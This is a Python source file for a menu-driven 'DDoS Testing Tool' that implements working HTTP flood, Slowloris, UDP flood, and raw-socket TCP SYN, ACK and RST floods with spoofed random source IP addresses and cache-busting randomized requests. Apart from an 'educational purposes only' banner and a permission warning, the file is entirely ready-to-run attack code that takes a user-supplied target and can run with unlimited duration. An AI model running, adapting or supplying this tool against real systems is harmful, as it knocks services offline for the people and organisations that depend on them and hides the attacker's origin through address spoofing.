import os
import requests
import socket
import threading
import random
import time
import json
import ssl
import struct
import ipaddress
from urllib.parse import urlparse, urlencode

########################################
#       Educational purpose only       #
########################################

if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")

class DDoSTestingTool:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
            "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0 Mobile/15E148 Safari/605.1.15"
        ]
        self.referers = [
            "https://google.it/",
            "https://facebook.com/",
            "https://duckduckgo.com/",
            "https://google.com/",
            "https://youtube.com",
            "https://yandex.com",
        ]
        self.is_attacking = False
        self.attack_threads = []
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        
    def random_user_agent(self):
        return random.choice(self.user_agents)
    
    def random_referer(self):
        return random.choice(self.referers)
    
    def random_ip(self):
        return ".".join(str(random.randint(0, 255)) for _ in range(4))
    
    def random_string(self, length=10):
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))
    
    def genstr(self, size):
        out_str = ''
        for _ in range(0, size):
            code = random.randint(65, 90)
            out_str += chr(code)
        return out_str
    
    def http_flood_attack(self, target_url, num_threads=50, duration=60, delay=0):
        """HTTP Flood Attack"""
        self.is_attacking = True
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        
        def attack():
            while self.is_attacking and (duration == 0 or time.time() - start_time < duration):
                try:
                    headers = {
                        'User-Agent': self.random_user_agent(),
                        'Referer': self.random_referer(),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache'
                    }
                    
                    # Randomize the path to avoid caching
                    parsed_url = urlparse(target_url)
                    path = parsed_url.path
                    if path == '':
                        path = '/'
                    
                    # Add random parameters to bypass caching
                    random_param = f"?cache_buster={random.randint(10000, 99999)}"
                    attack_url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}{random_param}"
                    
                    response = requests.get(attack_url, headers=headers, timeout=5)
                    
                    with threading.Lock():
                        self.request_count += 1
                        if response.status_code == 200:
                            self.success_count += 1
                        else:
                            self.failed_count += 1
                    
                    if delay > 0:
                        time.sleep(delay)
                        
                except Exception as e:
                    with threading.Lock():
                        self.request_count += 1
                        self.failed_count += 1
                    if delay > 0:
                        time.sleep(delay)
        
        start_time = time.time()
        print(f"[+] Starting HTTP Flood attack on {target_url}")
        print(f"[+] Threads: {num_threads}, Duration: {duration if duration > 0 else 'Unlimited'} seconds")
        
        # Create attack threads
        for i in range(num_threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        # Monitor attack progress
        while self.is_attacking and (duration == 0 or time.time() - start_time < duration):
            print(f"\r[+] Requests: {self.request_count}, Success: {self.success_count}, Failed: {self.failed_count}", end="")
            time.sleep(1)
        
        print(f"\n[+] HTTP Flood attack completed")
        return self.request_count, self.success_count, self.failed_count
    
    def scarlet_ddos_attack(self, target_url, num_threads=100):
        """Scarlet DDoS Attack (based on the provided code)"""
        self.is_attacking = True
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        
        class httpth1(threading.Thread):
            def __init__(self, tool):
                threading.Thread.__init__(self)
                self.tool = tool
                self.daemon = True
                
            def run(self):
                while self.tool.is_attacking:
                    try:
                        headers = {
                            'User-Agent': self.tool.random_user_agent(), 
                            'Referer': self.tool.random_referer()
                        }
                        randomized_url = target_url + "?" + self.tool.genstr(random.randint(3, 10))
                        response = requests.get(randomized_url, headers=headers, timeout=5)
                        
                        with threading.Lock():
                            self.tool.request_count += 1
                            if response.status_code == 200:
                                self.tool.success_count += 1
                            else:
                                self.tool.failed_count += 1
                            print(f"{self.tool.request_count} ScarletDDoS Sent")
                    except requests.exceptions.ConnectionError:
                        print("[Server might be down!]")
                    except requests.exceptions.InvalidSchema:
                        print("[URL Error]")
                        self.tool.is_attacking = False
                    except ValueError:
                        print("[Check Your URL]")
                        self.tool.is_attacking = False
                    except KeyboardInterrupt:
                        print("[Canceled by User]")
                        self.tool.is_attacking = False
                    except Exception as e:
                        with threading.Lock():
                            self.tool.request_count += 1
                            self.tool.failed_count += 1
        
        print(f"[+] Starting Scarlet DDoS attack on {target_url}")
        print(f"[+] Threads: {num_threads}")
        
        # Create attack threads
        for i in range(num_threads):
            t = httpth1(self)
            t.start()
            self.attack_threads.append(t)
        
        # Monitor attack progress
        try:
            while self.is_attacking:
                print(f"\r[+] Requests: {self.request_count}, Success: {self.success_count}, Failed: {self.failed_count}", end="")
                time.sleep(1)
        except KeyboardInterrupt:
            self.is_attacking = False
        
        print(f"\n[+] Scarlet DDoS attack completed")
        return self.request_count, self.success_count, self.failed_count
    
    def tcp_flood_attack(self, target, port=80, num_threads=50, duration=60, packet_size=1024):
        """TCP Flood Attack - Sends大量 TCP packets"""
        self.is_attacking = True
        self.request_count = 0
        
        def attack():
            while self.is_attacking and (duration == 0 or time.time() - start_time < duration):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((target, port))
                    
                    # Send random data
                    payload = random._urandom(packet_size)
                    s.send(payload)
                    
                    # Try to receive response (not always necessary for flood)
                    try:
                        s.recv(1)
                    except:
                        pass
                    
                    s.close()
                    
                    with threading.Lock():
                        self.request_count += 1
                        
                except Exception as e:
                    with threading.Lock():
                        self.request_count += 1
        
        start_time = time.time()
        print(f"[+] Starting TCP Flood attack on {target}:{port}")
        print(f"[+] Threads: {num_threads}, Duration: {duration if duration > 0 else 'Unlimited'} seconds")
        
        # Create attack threads
        for i in range(num_threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        # Monitor attack progress
        while self.is_attacking and (duration == 0 or time.time() - start_time < duration):
            print(f"\r[+] TCP connections: {self.request_count}", end="")
            time.sleep(1)
        
        print(f"\n[+] TCP Flood attack completed")
        return self.request_count
    
    def tcp_ack_flood_attack(self, target, port=80, num_threads=50, duration=60):
        """TCP ACK Flood Attack - Sends大量 TCP ACK packets"""
        self.is_attacking = True
        self.request_count = 0
        
        def create_ack_packet(source_ip, dest_ip, dest_port):
            # IP header
            ip_ver = 4
            ip_ihl = 5
            ip_tos = 0
            ip_tot_len = 0
            ip_id = random.randint(1, 65535)
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = socket.IPPROTO_TCP
            ip_check = 0
            ip_saddr = socket.inet_aton(source_ip)
            ip_daddr = socket.inet_aton(dest_ip)
            
            ip_ihl_ver = (ip_ver << 4) + ip_ihl
            
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                                ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
            
            # TCP header
            tcp_source = random.randint(1024, 65535)
            tcp_dest = dest_port
            tcp_seq = random.randint(1, 4294967295)
            tcp_ack_seq = random.randint(1, 4294967295)
            tcp_doff = 5
            tcp_fin = 0
            tcp_syn = 0
            tcp_rst = 0
            tcp_psh = 0
            tcp_ack = 1  # ACK flag set
            tcp_urg = 0
            tcp_window = socket.htons(5840)
            tcp_check = 0
            tcp_urg_ptr = 0
            
            tcp_offset_res = (tcp_doff << 4)
            tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
            
            tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, tcp_dest, tcp_seq,
                                 tcp_ack_seq, tcp_offset_res, tcp_flags,
                                 tcp_window, tcp_check, tcp_urg_ptr)
            
            # Pseudo header for checksum
            source_address = socket.inet_aton(source_ip)
            dest_address = socket.inet_aton(dest_ip)
            placeholder = 0
            protocol = socket.IPPROTO_TCP
            tcp_length = len(tcp_header)
            
            psh = struct.pack('!4s4sBBH',
                          source_address, dest_address,
                          placeholder, protocol, tcp_length)
            psh = psh + tcp_header
            
            tcp_check = self.checksum(psh)
            
            tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, tcp_dest, tcp_seq,
                                 tcp_ack_seq, tcp_offset_res, tcp_flags,
                                 tcp_window, tcp_check, tcp_urg_ptr)
            
            return ip_header + tcp_header
        
        def attack():
            while self.is_attacking and (duration == 0 or time.time() - start_time < duration):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    
                    source_ip = self.random_ip()
                    packet = create_ack_packet(source_ip, target, port)
                    
                    s.sendto(packet, (target, 0))
                    s.close()
                    
                    with threading.Lock():
                        self.request_count += 1
                        
                except Exception as e:
                    with threading.Lock():
                        self.request_count += 1
        
        start_time = time.time()
        print(f"[+] Starting TCP ACK Flood attack on {target}:{port}")
        print(f"[+] Threads: {num_threads}, Duration: {duration if duration > 0 else 'Unlimited'} seconds")
        
        # Create attack threads
        for i in range(num_threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        # Monitor attack progress
        while self.is_attacking and (duration == 0 or time.time() - start_time < duration):
            print(f"\r[+] ACK packets sent: {self.request_count}", end="")
            time.sleep(1)
        
        print(f"\n[+] TCP ACK Flood attack completed")
        return self.request_count
    
    def tcp_rst_attack(self, target, port=80, num_threads=30, duration=60):
        """TCP RST Attack - Sends TCP RST packets to reset connections"""
        self.is_attacking = True
        self.request_count = 0
        
        def create_rst_packet(source_ip, dest_ip, dest_port):
            # IP header
            ip_ver = 4
            ip_ihl = 5
            ip_tos = 0
            ip_tot_len = 0
            ip_id = random.randint(1, 65535)
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = socket.IPPROTO_TCP
            ip_check = 0
            ip_saddr = socket.inet_aton(source_ip)
            ip_daddr = socket.inet_aton(dest_ip)
            
            ip_ihl_ver = (ip_ver << 4) + ip_ihl
            
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                                ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
            
            # TCP header
            tcp_source = random.randint(1024, 65535)
            tcp_dest = dest_port
            tcp_seq = random.randint(1, 4294967295)
            tcp_ack_seq = random.randint(1, 4294967295)
            tcp_doff = 5
            tcp_fin = 0
            tcp_syn = 0
            tcp_rst = 1  # RST flag set
            tcp_psh = 0
            tcp_ack = 0
            tcp_urg = 0
            tcp_window = socket.htons(5840)
            tcp_check = 0
            tcp_urg_ptr = 0
            
            tcp_offset_res = (tcp_doff << 4)
            tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
            
            tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, tcp_dest, tcp_seq,
                                 tcp_ack_seq, tcp_offset_res, tcp_flags,
                                 tcp_window, tcp_check, tcp_urg_ptr)
            
            # Pseudo header for checksum
            source_address = socket.inet_aton(source_ip)
            dest_address = socket.inet_aton(dest_ip)
            placeholder = 0
            protocol = socket.IPPROTO_TCP
            tcp_length = len(tcp_header)
            
            psh = struct.pack('!4s4sBBH',
                          source_address, dest_address,
                          placeholder, protocol, tcp_length)
            psh = psh + tcp_header
            
            tcp_check = self.checksum(psh)
            
            tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, tcp_dest, tcp_seq,
                                 tcp_ack_seq, tcp_offset_res, tcp_flags,
                                 tcp_window, tcp_check, tcp_urg_ptr)
            
            return ip_header + tcp_header
        
        def attack():
            while self.is_attacking and (duration == 0 or time.time() - start_time < duration):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    
                    source_ip = self.random_ip()
                    packet = create_rst_packet(source_ip, target, port)
                    
                    s.sendto(packet, (target, 0))
                    s.close()
                    
                    with threading.Lock():
                        self.request_count += 1
                        
                except Exception as e:
                    with threading.Lock():
                        self.request_count += 1
        
        start_time = time.time()
        print(f"[+] Starting TCP RST attack on {target}:{port}")
        print(f"[+] Threads: {num_threads}, Duration: {duration if duration > 0 else 'Unlimited'} seconds")
        
        # Create attack threads
        for i in range(num_threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        # Monitor attack progress
        while self.is_attacking and (duration == 0 or time.time() - start_time < duration):
            print(f"\r[+] RST packets sent: {self.request_count}", end="")
            time.sleep(1)
        
        print(f"\n[+] TCP RST attack completed")
        return self.request_count
    
    def slowloris_attack(self, target, port=80, num_sockets=200, duration=60):
        """Slowloris Attack (partial HTTP requests)"""
        self.is_attacking = True
        sockets = []
        
        def create_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, port))
                
                # Send partial HTTP request
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target}\r\n".encode())
                s.send("User-Agent: {}\r\n".format(self.random_user_agent()).encode())
                s.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
                s.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
                s.send("Accept-Encoding: gzip, deflate\r\n".encode())
                s.send("Connection: keep-alive\r\n".encode())
                # Don't send the complete request
                return s
            except:
                return None
        
        print(f"[+] Starting Slowloris attack on {target}:{port}")
        print(f"[+] Sockets: {num_sockets}, Duration: {duration if duration > 0 else 'Unlimited'} seconds")
        
        # Create initial sockets
        for i in range(num_sockets):
            s = create_socket()
            if s:
                sockets.append(s)
        
        start_time = time.time()
        
        while self.is_attacking and (duration == 0 or time.time() - start_time < duration):
            try:
                # Try to keep all sockets open
                for s in list(sockets):
                    try:
                        # Send keep-alive headers
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        time.sleep(15)
                    except:
                        sockets.remove(s)
                        s.close()
                
                # Refill sockets if needed
                while len(sockets) < num_sockets and self.is_attacking:
                    s = create_socket()
                    if s:
                        sockets.append(s)
                    else:
                        time.sleep(0.1)
                
                print(f"\r[+] Active sockets: {len(sockets)}", end="")
                time.sleep(1)
            except KeyboardInterrupt:
                self.is_attacking = False
                break
        
        # Close all sockets
        for s in sockets:
            try:
                s.close()
            except:
                pass
        
        print(f"\n[+] Slowloris attack completed")
        return len(sockets)
    
    def udp_flood_attack(self, target, port=80, duration=60, packet_size=1024):
        """UDP Flood Attack"""
        self.is_attacking = True
        self.request_count = 0
        
        def attack():
            while self.is_attacking and (duration == 0 or time.time() - start_time < duration):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    # Generate random payload
                    payload = random._urandom(packet_size)
                    s.sendto(payload, (target, port))
                    s.close()
                    
                    with threading.Lock():
                        self.request_count += 1
                        
                except Exception as e:
                    with threading.Lock():
                        self.request_count += 1
        
        start_time = time.time()
        print(f"[+] Starting UDP Flood attack on {target}:{port}")
        print(f"[+] Duration: {duration if duration > 0 else 'Unlimited'} seconds")
        
        # Use multiple threads for UDP flood
        for i in range(10):  # 10 threads for UDP flood
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        # Monitor attack progress
        while self.is_attacking and (duration == 0 or time.time() - start_time < duration):
            print(f"\r[+] Packets sent: {self.request_count}", end="")
            time.sleep(1)
        
        print(f"\n[+] UDP Flood attack completed")
        return self.request_count
    
    def syn_flood_attack(self, target, port=80, duration=60):
        """SYN Flood Attack"""
        self.is_attacking = True
        self.request_count = 0
        
        def create_syn_packet(source_ip, dest_ip, dest_port):
            # IP header
            ip_ver = 4
            ip_ihl = 5
            ip_tos = 0
            ip_tot_len = 0  # kernel will fill this
            ip_id = random.randint(1, 65535)
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = socket.IPPROTO_TCP
            ip_check = 0  # kernel will fill this
            ip_saddr = socket.inet_aton(source_ip)
            ip_daddr = socket.inet_aton(dest_ip)
            
            ip_ihl_ver = (ip_ver << 4) + ip_ihl
            
            # IP header
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                                ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
            
            # TCP header
            tcp_source = random.randint(1024, 65535)
            tcp_dest = dest_port
            tcp_seq = random.randint(1, 4294967295)
            tcp_ack_seq = 0
            tcp_doff = 5
            tcp_fin = 0
            tcp_syn = 1
            tcp_rst = 0
            tcp_psh = 0
            tcp_ack = 0
            tcp_urg = 0
            tcp_window = socket.htons(5840)
            tcp_check = 0
            tcp_urg_ptr = 0
            
            tcp_offset_res = (tcp_doff << 4)
            tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
            
            tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, tcp_dest, tcp_seq,
                                 tcp_ack_seq, tcp_offset_res, tcp_flags,
                                 tcp_window, tcp_check, tcp_urg_ptr)
            
            # Pseudo header for checksum
            source_address = socket.inet_aton(source_ip)
            dest_address = socket.inet_aton(dest_ip)
            placeholder = 0
            protocol = socket.IPPROTO_TCP
            tcp_length = len(tcp_header)
            
            psh = struct.pack('!4s4sBBH',
                          source_address, dest_address,
                          placeholder, protocol, tcp_length)
            psh = psh + tcp_header
            
            tcp_check = self.checksum(psh)
            
            # Repack with correct checksum
            tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, tcp_dest, tcp_seq,
                                 tcp_ack_seq, tcp_offset_res, tcp_flags,
                                 tcp_window, tcp_check, tcp_urg_ptr)
            
            return ip_header + tcp_header
        
        def attack():
            while self.is_attacking and (duration == 0 or time.time() - start_time < duration):
                try:
                    # Create raw socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    
                    # Generate random source IP
                    source_ip = self.random_ip()
                    
                    # Create SYN packet
                    packet = create_syn_packet(source_ip, target, port)
                    
                    # Send packet
                    s.sendto(packet, (target, 0))
                    s.close()
                    
                    with threading.Lock():
                        self.request_count += 1
                        
                except Exception as e:
                    with threading.Lock():
                        self.request_count += 1
        
        start_time = time.time()
        print(f"[+] Starting SYN Flood attack on {target}:{port}")
        print(f"[+] Duration: {duration if duration > 0 else 'Unlimited'} seconds")
        
        # Use multiple threads for SYN flood
        for i in range(5):  # 5 threads for SYN flood
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        # Monitor attack progress
        while self.is_attacking and (duration == 0 or time.time() - start_time < duration):
            print(f"\r[+] SYN packets sent: {self.request_count}", end="")
            time.sleep(1)
        
        print(f"\n[+] SYN Flood attack completed")
        return self.request_count
    
    def checksum(self, data):
        """Calculate checksum for packet"""
        s = 0
        n = len(data) % 2
        for i in range(0, len(data) - n, 2):
            s += (data[i] << 8) + data[i+1]
        if n:
            s += data[i+1]
        while (s >> 16):
            s = (s & 0xFFFF) + (s >> 16)
        s = ~s & 0xFFFF
        return s
    
    def stop_all_attacks(self):
        """Stop all running attacks"""
        self.is_attacking = False
        for t in self.attack_threads:
            t.join(timeout=1)
        self.attack_threads = []
        print("[+] All attacks stopped")

def main():
    tool = DDoSTestingTool()
    
    while True:
        print("\n=== DDoS Testing Tool ===")
        print("1. HTTP Flood Attack")
        print("2. Scarlet DDoS Attack")
        print("3. TCP Flood Attack")
        print("4. TCP ACK Flood Attack")
        print("5. TCP RST Attack")
        print("6. Slowloris Attack")
        print("7. UDP Flood Attack")
        print("8. SYN Flood Attack")
        print("9. Stop All Attacks")
        print("10. Exit")
        
        choice = input("Select an option (1-10): ")
        
        if choice == '1':
            target = input("Enter target URL: ")
            threads = int(input("Number of threads (default: 50): ") or "50")
            duration = int(input("Duration in seconds (0 for unlimited, default: 60): ") or "60")
            delay = float(input("Delay between requests (0 for no delay, default: 0): ") or "0")
            tool.http_flood_attack(target, threads, duration, delay)
        
        elif choice == '2':
            target = input("Enter target URL: ")
            threads = int(input("Number of threads (default: 100): ") or "100")
            tool.scarlet_ddos_attack(target, threads)
        
        elif choice == '3':
            target = input("Enter target IP: ")
            port = int(input("Enter port (default: 80): ") or "80")
            threads = int(input("Number of threads (default: 50): ") or "50")
            duration = int(input("Duration in seconds (0 for unlimited, default: 60): ") or "60")
            packet_size = int(input("Packet size in bytes (default: 1024): ") or "1024")
            tool.tcp_flood_attack(target, port, threads, duration, packet_size)
        
        elif choice == '4':
            target = input("Enter target IP: ")
            port = int(input("Enter port (default: 80): ") or "80")
            threads = int(input("Number of threads (default: 50): ") or "50")
            duration = int(input("Duration in seconds (0 for unlimited, default: 60): ") or "60")
            tool.tcp_ack_flood_attack(target, port, threads, duration)
        
        elif choice == '5':
            target = input("Enter target IP: ")
            port = int(input("Enter port (default: 80): ") or "80")
            threads = int(input("Number of threads (default: 30): ") or "30")
            duration = int(input("Duration in seconds (0 for unlimited, default: 60): ") or "60")
            tool.tcp_rst_attack(target, port, threads, duration)
        
        elif choice == '6':
            target = input("Enter target IP/hostname: ")
            port = int(input("Enter port (default: 80): ") or "80")
            sockets = int(input("Number of sockets (default: 200): ") or "200")
            duration = int(input("Duration in seconds (0 for unlimited, default: 60): ") or "60")
            tool.slowloris_attack(target, port, sockets, duration)
        
        elif choice == '7':
            target = input("Enter target IP: ")
            port = int(input("Enter port (default: 80): ") or "80")
            duration = int(input("Duration in seconds (0 for unlimited, default: 60): ") or "60")
            packet_size = int(input("Packet size in bytes (default: 1024): ") or "1024")
            tool.udp_flood_attack(target, port, duration, packet_size)
        
        elif choice == '8':
            target = input("Enter target IP: ")
            port = int(input("Enter port (default: 80): ") or "80")
            duration = int(input("Duration in seconds (0 for unlimited, default: 60): ") or "60")
            tool.syn_flood_attack(target, port, duration)
        
        elif choice == '9':
            tool.stop_all_attacks()
        
        elif choice == '10':
            tool.stop_all_attacks()
            print("Exiting...")
            break
        
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    # Warning message
    print("=" * 70)
    print("WARNING: This tool is for educational purposes only!")
    print("Use only on systems you own or have explicit permission to test.")
    print("Unauthorized use is illegal and unethical.")
    print("=" * 70)
    
    time.sleep(2)  # Give user time to read warning
    main()
